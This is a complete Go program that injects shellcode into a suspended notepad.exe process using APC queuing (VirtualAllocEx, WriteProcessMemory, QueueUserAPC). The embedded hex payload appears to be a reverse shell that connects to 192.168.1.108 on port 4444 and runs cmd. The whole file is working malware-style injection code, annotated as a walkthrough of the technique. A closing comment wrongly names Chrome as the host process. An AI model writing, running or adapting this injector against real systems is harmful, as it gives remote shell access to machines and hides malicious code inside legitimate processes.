package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"

	"golang.org/x/sys/windows"
)

// PROCESS_BASIC_INFORMATION for querying process information
// (Note: This struct is defined but not used in the current implementation)
type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr //Pointer to the Process Environment Block
	Reserved2    uintptr
	UniquePid    uintptr //Process ID
	MoreReserved uintptr
}

func main() {
	//shellcode here
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a8016c41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5")

	//Windows API Structure for Process Creation
	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	//Target Path -- We will use notepad
	path := "C:\\Windows\\System32\\notepad.exe"

	//Create the process in SUSPENDED state
	//Crucial for APC injection- Thread must be suspended to queue APC
	err := windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path), //Exe Path
		nil,                            //Process security attributes
		nil,                            //Thread security attribute
		false,                          //Handle inheritance
		windows.CREATE_SUSPENDED,       //CREATE_SUSPENDED flag(0x00000004)
		nil,                            //Environment block
		nil,                            //Current directory
		&startupInfo,                   //Startup Information
		&outProcInfo)                   //Process information output

	if err != nil {
		log.Fatalf("[-]Failed to Create Process: %v", err)
	}
	fmt.Printf("[+]Process Created from Path: %s with PID %d \n", path, outProcInfo.ProcessId)
	fmt.Printf("[+]Process Handle: %x \n [+] Thread Handle: %x\n", outProcInfo.Process, outProcInfo.Thread)

	//Load kernel32.dll to access windows API functions
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")

	//Get VirtualAllocEx function for allocating memory in remote process
	procVirtualAllocEx := modkernel32.NewProc("VirtualAllocEx")

	//Allocate memory in the target process with EXECUTE permissions
	// This is where our shellcode will be written
	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(outProcInfo.Process), //Target process Handle
		uintptr(0),                   //Let system choose allocaton address
		uintptr(len(sc)),             //size to allocate(shellcode lenght)
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), //reserve and commit memory
		uintptr(windows.PAGE_EXECUTE_READ))              //Memory protection is readable and executble

	if addr == 0 {
		log.Fatalf("[+]VirualAlloc Failed: %v\n", lastErr)
	}

	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)

	//write the shellcode into the allocated memory in the target process
	var numberOfBytesWritten uintptr

	err = windows.WriteProcessMemory(outProcInfo.Process, uintptr(addr), &sc[0], uintptr(len(sc)), &numberOfBytesWritten)

	if err != nil {
		log.Fatalf("[-] Failed to WriteProcessMemory: %v\n", err)
	}

	fmt.Printf("[+]Wrote %d%d shellcode bytes to destination address\n", numberOfBytesWritten, len(sc))

	//Get the QueueUserAPC functions for APC injection
	procQueueUserAPC := modkernel32.NewProc("QueueUserAPC")
	//Queue the shellcode as APC to the suspended thread
	//APC will execute when the thread is resumed and enters an alterbale state
	success1, _, lastErr := procQueueUserAPC.Call(
		addr,                        //Pointer to the shellcode(APC function)
		uintptr(outProcInfo.Thread), //Target Thread handle
		0)                           //Not used
	if success1 == 0 {
		log.Fatalf("[-]QueueUserAPC Failed. %v \n", lastErr)
	}
	fmt.Printf("[+] Successfully queued APC to thread 0x%x \n", outProcInfo.Thread)

	//Resume the suspended Thread - this triggers APC execution
	//The thread will execute our shellcode when it becomes alertable
	_, err = windows.ResumeThread(windows.Handle(outProcInfo.Thread))

	if err != nil {
		log.Fatalf("[-] Can't resume thread. %v\n", err)
	}

	fmt.Println("[+] Resuming Suspended Thread - APC should execute shellcode!")

	//NOTE: The original Chrome process will continue to run normally
	//While our shellcode executed in the context of that Process
}
